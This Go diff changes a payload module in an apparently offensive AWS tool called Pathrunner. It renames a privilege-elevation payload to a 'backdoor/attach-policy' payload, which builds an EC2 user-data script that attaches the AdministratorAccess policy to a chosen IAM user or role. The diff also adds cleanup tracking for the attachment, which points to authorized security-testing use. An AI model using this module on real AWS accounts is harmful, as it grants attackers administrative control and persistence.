@@ -8,34 +8,33 @@ import (
 	"strings"
 )
 
-type DirectElevationPayload struct{}
+type BackdoorAttachPolicyPayload struct{}
 
-func NewDirectElevationPayload() *DirectElevationPayload {
-	return &DirectElevationPayload{}
+func NewBackdoorAttachPolicyPayload() *BackdoorAttachPolicyPayload {
+	return &BackdoorAttachPolicyPayload{}
 }
 
 func init() {
-	payloads.Register(NewDirectElevationPayload())
+	payloads.Register(NewBackdoorAttachPolicyPayload())
 }
 
-func (p *DirectElevationPayload) GetName() string {
-	return "elevation/direct"
+func (p *BackdoorAttachPolicyPayload) GetName() string {
+	return "backdoor/attach-policy"
 }
 
-func (p *DirectElevationPayload) GetDescription() string {
-	return "Directly elevate starting principal by attaching AdministratorAccess policy via user-data script"
+func (p *BackdoorAttachPolicyPayload) GetDescription() string {
+	return "Attach AdministratorAccess policy to target principal via user-data script"
 }
 
-func (p *DirectElevationPayload) GetTags() []string {
+func (p *BackdoorAttachPolicyPayload) GetTags() []string {
 	return []string{
 		payloads.TagServiceEC2,
 		payloads.TagLanguageBash,
-		payloads.TagTechniqueDirectAction,
-		payloads.TagTransportOutput,
+		payloads.TagTechniqueBackdoor,
 	}
 }
 
-func (p *DirectElevationPayload) GetOptions() []modules.Option {
+func (p *BackdoorAttachPolicyPayload) GetOptions() []modules.Option {
 	return []modules.Option{
 		{
 			Name:        "TARGET_PRINCIPAL_TYPE",
@@ -57,7 +56,7 @@ func (p *DirectElevationPayload) GetOptions() []modules.Option {
 	}
 }
 
-func (p *DirectElevationPayload) GenerateCode(options map[string]string) (string, error) {
+func (p *BackdoorAttachPolicyPayload) GenerateCode(options map[string]string) (string, error) {
 	principalType := options["TARGET_PRINCIPAL_TYPE"]
 	if principalType == "" {
 		principalType = "user"
@@ -81,7 +80,7 @@ func (p *DirectElevationPayload) GenerateCode(options map[string]string) (string
 	userDataScript := fmt.Sprintf(`#!/bin/bash
 exec > >(tee /var/log/pathrunner-elevation.log|logger -t pathrunner -s 2>/dev/console) 2>&1
 
-echo "Pathrunner Direct Elevation Payload"
+echo "Pathrunner Attach Policy Payload"
 echo "Target: %s (%s)"
 echo "Policy: %s"
 echo ""
@@ -107,7 +106,7 @@ echo "Elevation attempt complete"
 	return userDataScript, nil
 }
 
-func (p *DirectElevationPayload) ProcessResult(result string) (string, error) {
+func (p *BackdoorAttachPolicyPayload) ProcessResult(result string) (string, error) {
 	// For EC2 user-data payloads, result is typically instance metadata
 	var instanceData map[string]interface{}
 	if err := json.Unmarshal([]byte(result), &instanceData); err != nil {
@@ -116,7 +115,7 @@ func (p *DirectElevationPayload) ProcessResult(result string) (string, error) {
 	}
 
 	var output strings.Builder
-	output.WriteString("=== Direct Elevation Payload Results ===\n\n")
+	output.WriteString("=== Attach Policy Payload Results ===\n\n")
 
 	if instanceID, ok := instanceData["instance_id"].(string); ok {
 		output.WriteString("Instance ID: " + instanceID + "\n")
@@ -141,9 +140,42 @@ func (p *DirectElevationPayload) ProcessResult(result string) (string, error) {
 	return output.String(), nil
 }
 
-func (p *DirectElevationPayload) Validate(options map[string]string) error {
+// ReportSideEffects returns the policy attachment as a tracked modification.
+func (p *BackdoorAttachPolicyPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
+	principalType := options["TARGET_PRINCIPAL_TYPE"]
+	if principalType == "" {
+		principalType = "user"
+	}
+
+	principalName := options["TARGET_PRINCIPAL_NAME"]
+	policyArn := options["POLICY_ARN"]
+	if policyArn == "" {
+		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
+	}
+
+	cleanupMethod := "iam:DetachUserPolicy"
+	if principalType == "role" {
+		cleanupMethod = "iam:DetachRolePolicy"
+	}
+
+	return []modules.CreatedResource{
+		{
+			Type:          "iam:attached-policy",
+			Name:          fmt.Sprintf("%s←%s", principalName, "AdministratorAccess"),
+			ARN:           policyArn,
+			CleanupMethod: cleanupMethod,
+			Metadata: map[string]string{
+				"principal_type": principalType,
+				"principal_name": principalName,
+				"policy_arn":     policyArn,
+			},
+		},
+	}
+}
+
+func (p *BackdoorAttachPolicyPayload) Validate(options map[string]string) error {
 	if options["TARGET_PRINCIPAL_NAME"] == "" {
-		return fmt.Errorf("TARGET_PRINCIPAL_NAME is required for elevation/direct payload")
+		return fmt.Errorf("TARGET_PRINCIPAL_NAME is required for backdoor/attach-policy payload")
 	}
 
 	principalType := options["TARGET_PRINCIPAL_TYPE"]
